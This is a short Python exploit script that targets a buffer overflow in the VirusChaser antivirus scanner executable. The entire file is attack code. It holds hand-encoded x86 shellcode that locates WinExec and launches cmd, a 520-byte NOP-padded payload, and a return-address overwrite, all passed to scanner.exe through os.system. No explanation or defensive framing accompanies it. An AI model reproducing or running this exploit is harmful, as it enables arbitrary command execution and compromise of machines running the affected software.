from struct import pack
import os
 
shellcode = "\x66\x83\xc4\x10"        # add esp, 0x10
shellcode += "\xb8\x50\x70\x50\x50"   # mov eax, 0x50507050
shellcode += "\xb9\x4e\x7d\x04\x27"   # mov ecx, 0x27047d4e
shellcode += "\x03\xc1"               # add eax, ecx  ; WinExec() address
shellcode += "\x68\x63\x6d\x64\x01"   # push 0x01646D63
shellcode += "\x66\xb9\x50\x50"       # add cx, 0x5050
shellcode += "\x66\x81\xc1\xb0\xaf"   # add cx, 0xafb0
shellcode += "\x88\x4c\x24\x03"       # mov [esp+3], cl
shellcode += "\x8b\xd4"               # mov edx, esp
shellcode += "\x66\x51"               # push cx
shellcode += "\x41"                   # inc cx
shellcode += "\x66\x51"               # push cx
shellcode += "\x52"                   # push edx
shellcode += "\x50"                   # push eax
shellcode += "\x50"                   # push eax
shellcode += "\xc3\x90"               # retn  ; WinExec()
 
# BOF retn: 0x0040753d
 
pay = shellcode
pay = pay.rjust(520, "\x90")
pay += "\x9c\xdb\x12"
 
os.system("C:\\\"Program Files\\VirusChaser\\scanner.exe\" \"" + pay + "\"")